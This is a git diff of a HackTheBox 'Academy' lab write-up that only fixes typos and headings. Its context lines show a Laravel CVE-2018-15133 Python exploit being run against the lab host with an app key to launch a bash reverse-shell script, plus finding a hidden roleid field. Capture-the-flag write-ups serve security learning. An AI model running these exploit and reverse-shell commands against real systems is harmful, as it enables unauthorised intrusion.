@@ -180,7 +180,7 @@ ________________________________________________
 And there aren't any available directories.
 
 No ideas, let's check source code of pages *login.php, admin.php and register.php*.
-And find interesting hidden string win roleid in *academy.htb/register.php*.
+And find interesting hidden string with roleid in *academy.htb/register.php*.
 
 ![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_225417.png)
 
@@ -232,7 +232,7 @@ Searching some exploits for *Laravel*:
 * [Official Exploit in Metasploit](https://www.exploit-db.com/exploits/47129)
 * [Exploit on Python from GitHub](https://github.com/aljavier/exploit_laravel_cve-2018-15133)
 
-Because i don't like using msf, i will use python exploit.
+Because I don't like using msf, I will use python exploit.
 
 Download it
 ```
@@ -265,7 +265,7 @@ $
 We got shell as *www-data*
 
 
-Let's get an interactive reverse-shell
+### Let's get an interactive reverse-shell
 
 *Create bash reverse-shell
 ```
@@ -290,7 +290,7 @@ pasha.sh
 pasha.sh
 ```
 
-* Run it
+*Run it
 ```
 ┌──(root💀kali)-[/home/kali/HTB/Academy]
 └─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;/bin/bash pasha.sh;ls'
